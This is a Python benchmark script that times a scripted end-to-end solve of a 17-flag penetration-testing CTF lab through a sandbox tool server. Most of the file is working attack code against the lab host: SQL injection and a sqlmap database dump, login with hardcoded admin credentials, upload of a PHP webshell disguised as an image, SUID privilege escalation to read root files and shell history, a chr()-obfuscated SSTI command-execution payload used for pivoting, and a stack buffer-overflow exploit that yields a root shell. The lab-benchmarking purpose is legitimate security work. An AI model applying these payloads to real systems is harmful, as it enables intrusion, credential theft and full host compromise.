#!/usr/bin/env python3
"""Portal 5 — MBPTL CTF Benchmark.

Times each attack phase of the Most Basic Penetration Testing Lab (17-flag CTF)
through the sandbox MCP (portal5-sandbox at :8914). Measures real-world attack
latency end-to-end: web exploitation, SQLi, post-exploitation, pivoting, and
binary exploitation.

Phases benchmarked:
  recon       HTML comment + HTTP header + port 8080 (Flags 1-3)
  web_enum    Admin panel discovery (Flag 4)
  sqli        Error-based SQLi + sqlmap dump + admin login (Flags 5-7)
  postexploit Webshell upload + user.txt + root.txt via SUID bahs (Flags 8-9)
  soc         Apache log + bash_history + bashrc via webshell (Flags 10-12)
  pivot       Internal mbptl-app SSTI + flags 13-14 via webshell tunnel
  binary      Binary download + nc banner + buffer overflow shell (Flags 15-17)

Usage:
    python3 tests/benchmarks/bench_mbptl.py
    python3 tests/benchmarks/bench_mbptl.py --phases recon web_enum sqli
    python3 tests/benchmarks/bench_mbptl.py --runs 3
    python3 tests/benchmarks/bench_mbptl.py --output results/bench_mbptl.json
    python3 tests/benchmarks/bench_mbptl.py --dry-run

Requires:
    LAB_MBPTL_HOST set in .env or environment
    MBPTL containers running (./launch.sh lab-mbptl OR docker compose --profile lab-mbptl up -d)
    mcp-sandbox container running (:8914)
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import httpx

_ROOT = Path(__file__).resolve().parents[2]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

RESULTS_DIR = Path(__file__).parent / "results"


# ── Env ───────────────────────────────────────────────────────────────────────

def _load_env() -> None:
    env_file = _ROOT / ".env"
    if env_file.exists():
        for line in env_file.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip())


_load_env()

SANDBOX_PORT    = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
HOST            = os.environ.get("LAB_MBPTL_HOST", "")
WEB_PORT        = int(os.environ.get("LAB_MBPTL_PORT_WEB", "80"))
ADMIN_PORT      = int(os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080"))
MBPTL_LXC_VMID = os.environ.get("LAB_MBPTL_LXC_VMID", "")

PROXMOX_MCP_PORT = int(os.environ.get("PROXMOX_MCP_HOST_PORT", "8927"))

ADMIN_USER = "admin"
ADMIN_PASS = "P@ssw0rd!"

ALL_PHASES = ["recon", "web_enum", "sqli", "postexploit", "soc", "pivot", "binary"]

_SHELL_PATH: str = ""


# ── MCP calls ─────────────────────────────────────────────────────────────────

def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
    if dry_run:
        return {"ok": True, "output": "[dry-run]", "elapsed_s": 0.0}

    base = f"http://localhost:{SANDBOX_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        sid = ""
        with c.stream("POST", base, headers=hdrs, json={
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                       "clientInfo": {"name": "bench_mbptl", "version": "1"}},
        }) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs

        last_result: dict = {}
        with c.stream("POST", base, headers=call_hdrs, json={
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": "execute_bash",
                       "arguments": {"code": code, "timeout": timeout}},
        }) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else ""
    error = last_result.get("error")
    ok = error is None and bool(text)
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


def _proxmox_mcp_call(tool_name: str, arguments: dict[str, Any], timeout: int = 180) -> dict[str, Any]:
    base = f"http://localhost:{PROXMOX_MCP_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        sid = ""
        with c.stream("POST", base, headers=hdrs, json={
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                       "clientInfo": {"name": "bench_mbptl", "version": "1"}},
        }) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
        last_result: dict = {}
        with c.stream("POST", base, headers=call_hdrs, json={
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments},
        }) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    error = last_result.get("error")
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else json.dumps(last_result.get("result", {}))
    ok = error is None
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


# ── Flag extraction ───────────────────────────────────────────────────────────

def _extract_flags(text: str, numbers: list[int]) -> list[str]:
    found = []
    for n in numbers:
        m = re.search(rf"MBPTL-{n}\{{[^}}]+\}}", text)
        if m:
            found.append(m.group())
    return found


# ── Phase definitions ─────────────────────────────────────────────────────────

def _phase_recon(dry_run: bool) -> dict:
    code = f"""
F1=$(curl -s "http://{HOST}:{WEB_PORT}/" | grep -o 'MBPTL-1{{[^}}]*}}')
F2=$(curl -sI "http://{HOST}:{WEB_PORT}/" | grep -i 'X-MBPTL:' | grep -o 'MBPTL-2{{[^}}]*}}')
F3=$(curl -s "http://{HOST}:{ADMIN_PORT}/" | grep -o 'MBPTL-3{{[^}}]*}}')
echo "F1=$F1"
echo "F2=$F2"
echo "F3=$F3"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [1, 2, 3])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_web_enum(dry_run: bool) -> dict:
    code = f"""
F4=$(curl -s "http://{HOST}:{ADMIN_PORT}/administrator/" | grep -o 'MBPTL-4{{[^}}]*}}')
echo "F4=$F4"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [4])
    ok = len(flags) == 1
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/1 flags found"}


def _phase_sqli(dry_run: bool) -> dict:
    code = f"""
F5=$(curl -s "http://{HOST}:{WEB_PORT}/detail.php?id=1%27" | grep -o 'MBPTL-5{{[^}}]*}}')
echo "F5=$F5"

F6=$(sqlmap -u "http://{HOST}:{WEB_PORT}/detail.php?id=1" \
  -D administrator --dump --batch --level=1 --risk=1 --threads=4 -q 2>&1 \
  | grep -o 'MBPTL-6{{[^}}]*}}')
echo "F6=$F6"

curl -s -c /tmp/mbptl_cook.txt -b /tmp/mbptl_cook.txt \
  -d "username={ADMIN_USER}&password=P%40ssw0rd%21" \
  "http://{HOST}:{ADMIN_PORT}/administrator/" > /tmp/mbptl_login.html

F7=$(curl -s -c /tmp/mbptl_cook.txt -b /tmp/mbptl_cook.txt \
  "http://{HOST}:{ADMIN_PORT}/administrator/admin.php" \
  | grep -o 'MBPTL-7{{[^}}]*}}')
echo "F7=$F7"
"""
    r = _mcp_call(code, timeout=150, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [5, 6, 7])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_postexploit(dry_run: bool) -> dict:
    global _SHELL_PATH
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
ADMIN_PORT = {ADMIN_PORT}
WEB_PORT = {WEB_PORT}

subprocess.run([
    "curl", "-s", "-c", "/tmp/mbptl_cook.txt", "-b", "/tmp/mbptl_cook.txt",
    "-d", "username=admin&password=P%40ssw0rd%21",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/",
], capture_output=True, timeout=15)

with open("/tmp/s.php", "w") as f:
    f.write("<?php system($_GET['cmd']); ?>")

subprocess.run([
    "curl", "-s", "-c", "/tmp/mbptl_cook.txt", "-b", "/tmp/mbptl_cook.txt",
    "-F", "title=x", "-F", "author=x", "-F", "year=2024", "-F", "synopsis=x",
    "-F", "image=@/tmp/s.php;type=image/jpeg;filename=s.php",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/admin.php",
], capture_output=True, timeout=15)

r = subprocess.run(
    ["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"],
    capture_output=True, text=True, timeout=15,
)
m = re.search(r"administrator/uploads/[^\"']*\\.php", r.stdout)
if not m:
    print("SHELL_NOT_FOUND")
    raise SystemExit(1)

shell_path = m.group()
print(f"SHELL={{shell_path}}")

with open("/tmp/mbptl_shell_path.txt", "w") as f:
    f.write(shell_path)

def webshell(cmd):
    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
    return r.stdout

f8 = webshell("cat /flag/user.txt")
print(f"F8={{f8.strip()}}")

f9 = webshell("bash -c '/bin/bahs <<< \"cat /flag/root.txt\"'")
print(f"F9={{f9.strip()}}")
PYEOF
"""
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    out = r["output"]

    shell_m = re.search(r"SHELL=(administrator/uploads/\S+\.php)", out)
    if shell_m and not dry_run:
        _SHELL_PATH = shell_m.group(1)

    flags = _extract_flags(out, [8, 9])
    ok = len(flags) == 2
    shell_note = f" shell={_SHELL_PATH}" if _SHELL_PATH else " shell=MISSING"
    return {**r, "ok": ok, "flags_found": flags, "shell_path": _SHELL_PATH,
            "detail": f"{len(flags)}/2 flags found{shell_note}"}


def _phase_soc(dry_run: bool) -> dict:
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
WEB_PORT = {WEB_PORT}

try:
    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
except FileNotFoundError:
    print("NO_SHELL_PATH")
    raise SystemExit(1)

def webshell(cmd):
    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
    return r.stdout

f10_raw = webshell("cat /var/log/apache2/access.log")
m10 = re.search(r"MBPTL-10{{[^}}]+}}", f10_raw)
print("F10=" + (m10.group() if m10 else "NOT_FOUND"))

f11_raw = webshell("bash -c '/bin/bahs <<< \"cat /root/.bash_history\"'")
m11 = re.search(r"MBPTL-11{{[^}}]+}}", f11_raw)
print("F11=" + (m11.group() if m11 else "NOT_FOUND"))

f12_raw = webshell("bash -c '/bin/bahs <<< \"cat /root/.bashrc\"'")
m12 = re.search(r"MBPTL-12{{[^}}]+}}", f12_raw)
print("F12=" + (m12.group() if m12 else "NOT_FOUND"))
PYEOF
"""
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [10, 11, 12])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_pivot(dry_run: bool) -> dict:
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
WEB_PORT = {WEB_PORT}

try:
    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
except FileNotFoundError:
    print("NO_SHELL_PATH")
    raise SystemExit(1)

def webshell(cmd):
    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
    return r.stdout

f13_raw = webshell("curl -s http://mbptl-app:5000/")
m13 = re.search(r"MBPTL-13{{[^}}]+}}", f13_raw)
print("F13=" + (m13.group() if m13 else "NOT_FOUND"))

# SSTI payload using chr() to avoid shell quoting issues
ssti = "{{{{request.application.__globals__.__builtins__.__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()}}}}"
f14_raw = webshell(f"curl -s 'http://mbptl-app:5000/?name={ssti}'")
m14 = re.search(r"MBPTL-14{{[^}}]+}}", f14_raw)
print("F14=" + (m14.group() if m14 else "NOT_FOUND"))
PYEOF
"""
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [13, 14])
    ok = len(flags) == 2
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/2 flags found"}


def _phase_binary(dry_run: bool) -> dict:
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, struct, urllib.parse

HOST = "{HOST}"
ADMIN_PORT = {ADMIN_PORT}
WEB_PORT = {WEB_PORT}

try:
    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
except FileNotFoundError:
    shell_path = ""

def webshell(cmd, timeout=30):
    if not shell_path:
        return ""
    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=timeout)
    return r.stdout

subprocess.run([
    "curl", "-s", "-o", "/tmp/mbptl-bin",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/main",
], capture_output=True, timeout=30)
r15 = subprocess.run(["strings", "/tmp/mbptl-bin"], capture_output=True, text=True)
m15 = re.search(r"MBPTL-15{{[^}}]+}}", r15.stdout)
print("F15=" + (m15.group() if m15 else "NOT_FOUND"))

f16_raw = webshell("nc -w 3 mbptl-internal 31337 </dev/null 2>&1 || echo TIMEOUT")
m16 = re.search(r"MBPTL-16{{[^}}]+}}", f16_raw)
print("F16=" + (m16.group() if m16 else "NOT_FOUND"))

bof_cmd = (
    "python3 -c \""
    "import socket,struct,time;"
    "s=socket.socket();"
    "s.connect(('mbptl-internal',31337));"
    "s.settimeout(5);"
    "s.recv(512);"
    "p=b'A'*136+struct.pack('<Q',0x4006c6);"
    "s.sendall(p+b'\\nid\\ncat /flag.txt\\n');"
    "import time;time.sleep(1);"
    "print(s.recv(4096).decode(errors='ignore'))"
    "\" 2>&1"
)
f17_raw = webshell(bof_cmd, timeout=45)
m17 = re.search(r"MBPTL-17{{[^}}]+}}", f17_raw)
bof_ok = bool(m17) or "uid=0" in f17_raw or ("root" in f17_raw.lower() and "id=" in f17_raw)
print("F17=" + (m17.group() if m17 else ("BOF_SHELL_OK" if bof_ok else "NOT_FOUND")))
print(f"BOF_OUTPUT={{f17_raw[:300]}}")
PYEOF
"""
    r = _mcp_call(code, timeout=120, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [15, 16, 17])
    bof_credit = "BOF_SHELL_OK" in out or (
        "uid=0" in out and "F17=NOT_FOUND" not in out.split("BOF_OUTPUT")[0]
    )
    f17_found = any("MBPTL-17" in f for f in flags)
    effective = len(flags) + (1 if bof_credit and not f17_found else 0)
    ok = effective == 3
    detail = f"{effective}/3 flags found" + (" (BOF shell confirmed)" if bof_credit else "")
    return {**r, "ok": ok, "flags_found": flags, "detail": detail}


PHASE_FNS = {
    "recon":       _phase_recon,
    "web_enum":    _phase_web_enum,
    "sqli":        _phase_sqli,
    "postexploit": _phase_postexploit,
    "soc":         _phase_soc,
    "pivot":       _phase_pivot,
    "binary":      _phase_binary,
}

PHASE_FLAGS = {
    "recon":       [1, 2, 3],
    "web_enum":    [4],
    "sqli":        [5, 6, 7],
    "postexploit": [8, 9],
    "soc":         [10, 11, 12],
    "pivot":       [13, 14],
    "binary":      [15, 16, 17],
}


# ── Lab lifecycle ─────────────────────────────────────────────────────────────

def lab_setup(dry_run: bool = False) -> bool:
    if not MBPTL_LXC_VMID:
        print("  [proxmox-mcp] lifecycle skipped — LAB_MBPTL_LXC_VMID not set")
        return True
    print("\n── Lab Setup (Proxmox MCP :8927) ──")
    if dry_run:
        print(f"  [proxmox-mcp] DRY-RUN — would start LXC vmid={MBPTL_LXC_VMID}")
        return True
    print(f"  [proxmox-mcp] starting LXC vmid={MBPTL_LXC_VMID} ...", end=" ", flush=True)
    try:
        r = _proxmox_mcp_call("proxmox_container_start", {"vmid": int(MBPTL_LXC_VMID), "wait": True}, timeout=60)
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        print("  waiting 10s for MBPTL containers to settle ...", end=" ", flush=True)
        time.sleep(10)
        print("ok")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


# ── Runner ────────────────────────────────────────────────────────────────────

def run_bench(
    phases: list[str],
    runs: int,
    dry_run: bool,
    output_path: Path | None,
    manage_lifecycle: bool = False,
) -> None:
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    results: dict[str, Any] = {
        "bench": "mbptl",
        "started_at": ts,
        "host": HOST,
        "web_port": WEB_PORT,
        "admin_port": ADMIN_PORT,
        "dry_run": dry_run,
        "runs": runs,
        "total_flags": 17,
        "phases": {},
    }

    total_t0 = time.monotonic()
    print(f"\nPortal 5 — MBPTL CTF Bench  [{ts}]")
    print(f"HOST={HOST}  WEB_PORT={WEB_PORT}  ADMIN_PORT={ADMIN_PORT}")
    print(f"runs={runs}  dry_run={dry_run}")
    print(f"Phases: {', '.join(phases)}\n")

    if manage_lifecycle:
        if not lab_setup(dry_run=dry_run):
            print("[!] Lab setup failed — aborting")
            return

    for phase in phases:
        fn = PHASE_FNS[phase]
        timings: list[float] = []
        ok_count = 0
        all_flags: list[str] = []
        last_result: dict = {}
        for run_n in range(1, runs + 1):
            print(f"  [{phase}] run {run_n}/{runs} ...", end=" ", flush=True)
            result = fn(dry_run)
            timings.append(result["elapsed_s"])
            if result.get("ok"):
                ok_count += 1
            for f in result.get("flags_found", []):
                if f not in all_flags:
                    all_flags.append(f)
            last_result = result
            status = "OK" if result.get("ok") else "FAIL"
            print(f"{status}  {result['elapsed_s']:.1f}s  {result.get('detail', '')}")

        avg = sum(timings) / len(timings) if timings else 0.0
        results["phases"][phase] = {
            "runs": runs,
            "ok": ok_count,
            "fail": runs - ok_count,
            "elapsed_s": {"min": min(timings), "max": max(timings), "avg": round(avg, 2)},
            "flags_found": all_flags,
            "flags_expected": PHASE_FLAGS[phase],
            "detail": last_result.get("detail", ""),
        }
        if not last_result.get("ok") and not dry_run:
            print(f"\n  [!] Last output:\n{last_result.get('output', '')[-800:]}\n")

    total_elapsed = time.monotonic() - total_t0
    results["total_elapsed_s"] = round(total_elapsed, 1)
    results["finished_at"] = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

    all_found: list[str] = []
    for pr in results["phases"].values():
        all_found.extend(pr.get("flags_found", []))
    results["flags_found_total"] = len(set(all_found))
    results["flags_found"] = sorted(set(all_found))

    print(f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  {'Flags':>6}  Detail")
    print("─" * 80)
    for phase, pr in results["phases"].items():
        e = pr["elapsed_s"]
        nf = len(pr.get("flags_found", []))
        ne = len(pr.get("flags_expected", []))
        print(
            f"{phase:<14} {pr['ok']:>4} {pr['fail']:>4}"
            f" {e['avg']:>8.1f} {e['min']:>6.1f} {e['max']:>6.1f}"
            f" {nf:>3}/{ne:<2}  {pr['detail']}"
        )
    print(f"\nTotal: {total_elapsed:.1f}s  Flags: {results['flags_found_total']}/17")

    out = output_path or RESULTS_DIR / f"bench_mbptl_{ts}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(results, indent=2))
    print(f"Results → {out}")

    if any(pr["fail"] > 0 for pr in results["phases"].values()):
        sys.exit(1)


# ── CLI ───────────────────────────────────────────────────────────────────────

def _parse() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--phases", nargs="+", choices=ALL_PHASES, default=ALL_PHASES,
                   help="phases to run (default: all)")
    p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
    p.add_argument("--output", type=Path, help="JSON results file path")
    p.add_argument("--dry-run", action="store_true", help="skip MCP calls, measure overhead only")
    p.add_argument("--lifecycle", action="store_true",
                   help="Start MBPTL LXC via Proxmox MCP before bench (requires LAB_MBPTL_LXC_VMID)")
    return p.parse_args()


if __name__ == "__main__":
    args = _parse()
    if not HOST and not args.dry_run:
        print("ERROR: LAB_MBPTL_HOST not set. Set it in .env or environment.")
        sys.exit(1)
    run_bench(args.phases, args.runs, args.dry_run, args.output, manage_lifecycle=args.lifecycle)
